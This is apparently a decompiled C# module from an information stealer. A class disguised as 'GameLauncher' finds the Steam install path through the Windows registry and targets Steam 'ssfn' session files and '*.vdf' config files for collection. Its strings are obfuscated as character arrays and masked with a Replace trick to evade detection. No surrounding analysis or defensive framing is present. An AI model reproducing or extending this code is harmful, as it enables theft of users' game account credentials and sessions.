using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

// Token: 0x02000018 RID: 24
public class GameLauncher : Extractor
{
	// Token: 0x0600009C RID: 156 RVA: 0x000079A4 File Offset: 0x00005DA4
	public override string Id2(Entity_FileSearchInformation scannerArg, FileInfo fileInfo)
	{
		try
		{
			bool flag = scannerArg.Id1.Contains(new string(new char[]
			{
				'c',
				'o',
				'n',
				'f',
				'i',
				'g'
			}));
			if (flag)
			{
				return new string(new char[]
				{
					'c',
					'o',
					'n',
					'f',
					'i',
					'g'
				});
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x0600009D RID: 157 RVA: 0x00007A14 File Offset: 0x00005E14
	public override IEnumerable<Entity_FileSearchInformation> Id3()
	{
		List<Entity_FileSearchInformation> list = new List<Entity_FileSearchInformation>();
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(new string(new char[]
			{
				'S',
				'o',
				'f',
				't',
				'w',
				'a',
				'r',
				'e',
				'\\',
				'V',
				'a',
				'l',
				'v',
				'e',
				'\\',
				'S',
				't',
				'e',
				'a',
				'm'
			}));
			bool flag = registryKey == null;
			if (flag)
			{
				return list;
			}
			string text = registryKey.GetValue(new string(new char[]
			{
				'S',
				't',
				'e',
				'a',
				'm',
				'P',
				'a',
				't',
				'h'
			})) as string;
			bool flag2 = !Directory.Exists(text);
			if (flag2)
			{
				return list;
			}
			list.Add(new Entity_FileSearchInformation
			{
				Id1 = text,
				Id2 = new string(new char[]
				{
					'*',
					's',
					's',
					'f',
					'n',
					'*'
				}),
				Id3 = false
			});
			list.Add(new Entity_FileSearchInformation
			{
				Id1 = Path.Combine(text, new string(new char[]
				{
					'c',
					'o',
					'n',
					'f',
					'i',
					'g'
				})),
				Id2 = new string(new char[]
				{
					'*',
					'.',
					'v',
					's',
					't',
					'r',
					'i',
					'n',
					'g',
					'.',
					'R',
					'e',
					'p',
					'l',
					'a',
					'c',
					'e',
					'd',
					'f'
				}).Replace("string.Replace", string.Empty),
				Id3 = false
			});
		}
		catch
		{
		}
		return list;
	}
}
